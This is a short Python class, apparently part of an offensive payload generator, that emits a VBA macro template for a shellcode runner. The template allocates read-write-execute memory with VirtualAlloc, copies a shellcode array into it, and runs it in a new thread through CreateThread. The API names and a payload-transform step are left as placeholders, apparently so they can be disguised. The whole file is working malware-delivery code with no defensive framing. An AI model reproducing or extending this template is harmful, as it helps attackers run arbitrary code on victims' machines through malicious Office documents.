class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return """
    Dim shellcode As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    Dim success As Long

    {transformers}

    ' &H3000 = 0x3000 = MEM_COMMIT | MEM_RESERVE
    ' &H40 = 0x40 = PAGE_EXECUTE_READWRITE
    addr = {VirtualAlloc}(0, UBound(shellcode), &H3000, &H40)

    For counter = LBound(shellcode) To UBound(shellcode)
      data = shellcode(counter)
      res = {RtlMoveMemory}(addr + counter, data, 1)
    Next counter

    res = {CreateThread}(0, 0, addr, 0, 0, 0)
    success = {WaitForSingleObject}(res, &HFFFFFFFF&)
"""